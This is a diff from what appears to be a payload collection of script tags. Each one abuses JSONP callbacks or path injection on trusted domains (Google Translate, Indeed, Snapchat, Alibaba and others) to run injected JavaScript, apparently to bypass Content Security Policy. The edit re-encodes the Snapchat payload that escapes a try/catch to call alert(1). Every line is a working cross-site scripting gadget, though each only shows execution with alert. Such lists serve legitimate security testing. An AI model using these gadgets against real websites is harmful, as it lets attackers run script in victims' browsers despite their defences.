@@ -170,7 +170,7 @@ translate.google.com	<script src="https://translate.google.com/translate_a/eleme
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
 tr.indeed.com	<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>
-tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/%27%29%7d%63%61%74%63%68%28%65%29%7b%7d%7d%28%29%3b%61%6c%65%72%74%28%31%29%2f%2f.js"></script>
+tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/')%7Dcatch(e)%7B%7D%7D()%3balert(1)%2f%2f.js"></script>
 udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>
 ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>
 uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
